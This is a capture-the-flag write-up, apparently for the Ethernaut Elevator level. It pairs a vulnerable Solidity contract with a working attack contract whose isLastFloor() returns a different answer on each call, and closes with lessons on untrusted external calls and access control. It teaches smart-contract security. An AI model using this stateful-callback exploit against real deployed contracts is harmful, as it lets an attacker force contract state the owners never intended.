# ●●○○○ Elevator
- This elevator won't let you reach the top of your building. Right?

Things that might help:
- Sometimes solidity is not good at keeping promises.
- This Elevator expects to be used from a Building.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```
## The above contract:
  - The Elevator contract assumes it will call a pure/view function or at least a truthful one.
  - There is no reinforcement in access control.
  - It assumes that the isLastFloor() behaves equally on each call.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract Zero is Building {

    bool toggle;
    Elevator public victimElevator;

    constructor(address _victimAddress){
        victimElevator = Elevator(_victimAddress);
    }

    function isLastFloor(uint256) external override returns (bool){
        toggle = !toggle;
        return toggle;
    }
    
    function attack() external {
        victimElevator.goTo(5);
    }
}
```

# Takeaways:
📌 Takeaway: Don’t rely on external contracts (or msg.sender) to enforce important logic.

🧩 2. Interfaces don't enforce behavior — only structure
The Building interface only defines the shape of the function:

📌 Takeaway: Interfaces help define structure, not logic. Always be cautious when calling external code via interfaces.

🔁 3. External calls can behave differently each time
The Elevator contract calls isLastFloor() twice, assuming the result won't change.

📌 Takeaway: Don't assume deterministic results from external calls — they can be stateful or malicious.

🔐 4. Always minimize trust — use patterns like onlyOwner, whitelists, or pull instead of push
The Elevator contract trusts msg.sender is a legitimate Building. But it doesn’t:

Use access control
📌 Takeaway: Introduce access control or sanity checks when calling untrusted contracts.


# Summary of Lessons
- Risk             	         : --->  Lesson <br />
Trusting external calls	     : --->  Validate or restrict them <br />
Interfaces vs logic	         : --->  Interfaces are contracts' shapes, not their behaviors <br />
Assumptions about consistency: --->	 External contracts can lie or act differently between calls <br />
Lack of access control	     : --->  Use onlyOwner, whitelists, or other guards <br />
Dangerous external design	   : --->  Beware of composability without validation <br />

